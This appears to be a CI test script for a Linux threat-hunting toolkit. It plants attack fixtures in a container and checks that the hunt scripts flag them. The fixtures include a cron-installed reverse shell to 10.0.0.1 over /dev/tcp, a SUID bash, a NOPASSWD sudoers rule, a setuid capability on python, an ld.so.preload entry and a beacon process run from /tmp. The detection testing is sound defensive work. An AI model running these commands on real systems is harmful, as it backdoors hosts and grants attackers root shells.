#!/usr/bin/env bash
# Usage: DISTRO=<label> ./tests/ci/linux-hunts.sh   # runs as root in a container; writes ci-findings/*.tsv + step summary
# Smoke-runs every linux/hunt/**/get-*.sh (rc 0/2 ok, 1 = error) then plants fixtures and asserts detection.
set -uo pipefail
cd "$(dirname "$0")/../.." || exit 1
DISTRO=${DISTRO:-linux}
out=ci-findings
mkdir -p "$out"
sum=${GITHUB_STEP_SUMMARY:-/dev/null}
[[ $EUID -eq 0 ]] || { echo "run as root" >&2; exit 1; }
export PATH="$PATH:/usr/sbin:/sbin"   # bare `sshd` lives in sbin, not always on a container PATH

ok=1
drows=$'| Assertion | Result |\n|---|---|'
check() { if eval "$2"; then echo "PASS $1"; r=PASS; else echo "FAIL $1"; r=FAIL; ok=0; fi; drows+=$'\n'"| $1 | $r |"; }

# sshd audit runs `sshd -T`, which needs host keys and the privsep dir, but not the daemon
mkdir -p /run/sshd
ssh-keygen -A >/dev/null 2>&1 || true

echo "== plant fixtures"
chmod u+s "$(command -v bash)"                                   # privesc: named GTFOBins SUID
mkdir -p /etc/sudoers.d
echo 'ciuser ALL=(ALL) NOPASSWD: ALL' > /etc/sudoers.d/90-ci     # privesc: NOPASSWD
if command -v setcap >/dev/null && command -v python3 >/dev/null; then
  cp "$(command -v python3)" /usr/local/bin/pycap && setcap cap_setuid+ep /usr/local/bin/pycap   # privesc: capability
fi
mkdir -p /etc/cron.d
printf '* * * * * root bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n' > /etc/cron.d/red   # autostart: cron reverse shell
echo /usr/lib/libx.so > /etc/ld.so.preload                       # autostart: global preload
cp "$(command -v bash)" /tmp/.beacon   # bash is a standalone ELF everywhere; /bin/sleep may be a coreutils-single multicall symlink
nohup /tmp/.beacon -c 'sleep 300; :' </dev/null >/dev/null 2>&1 &   # lotl: a process running from a writable dir

echo "== smoke"
srows=$'| Hunt | rc | FAIL | WARN |\n|---|---|---|---|'
while IFS= read -r h; do
  name=$(basename "$h" .sh)
  if [[ $name == get-sshd-config-findings ]] && ! command -v sshd >/dev/null; then
    echo "SKIP  $name (no sshd)"; srows+=$'\n'"| $name | skip (no sshd) | - | - |"; continue
  fi
  "$h" > "$out/$name.tsv" 2>/dev/null; rc=$?
  nf=$(grep -c '^FAIL' "$out/$name.tsv" || true)
  nw=$(grep -c '^WARN' "$out/$name.tsv" || true)
  if [[ $rc != 0 && $rc != 2 ]]; then echo "FAIL  $name rc=$rc"; ok=0; res="err($rc)"; else echo "ok    $name rc=$rc"; res="ok($rc)"; fi
  srows+=$'\n'"| $name | $res | $nf | $nw |"
done < <(find linux/hunt -name 'get-*.sh' | sort)

echo "== detect"
check "privesc flags SUID bash"        "grep -qE '^FAIL[[:space:]]suid' $out/get-privesc-findings.tsv"
check "privesc flags NOPASSWD sudoers" "grep -qi nopasswd $out/get-privesc-findings.tsv"
check "autostart flags cron backdoor"  "grep -q /etc/cron.d/red $out/get-autostart-findings.tsv"
check "autostart flags ld.so.preload"  "grep -q ld.so.preload $out/get-autostart-findings.tsv"
check "lotl flags /tmp process"        "grep -q proc-tmp $out/get-lotl-findings.tsv"

{
  echo "## Linux hunts — $DISTRO"
  echo; echo "### smoke"; echo "$srows"
  echo; echo "### detection"; echo "$drows"; echo
} >> "$sum"

[[ $ok -eq 1 ]]
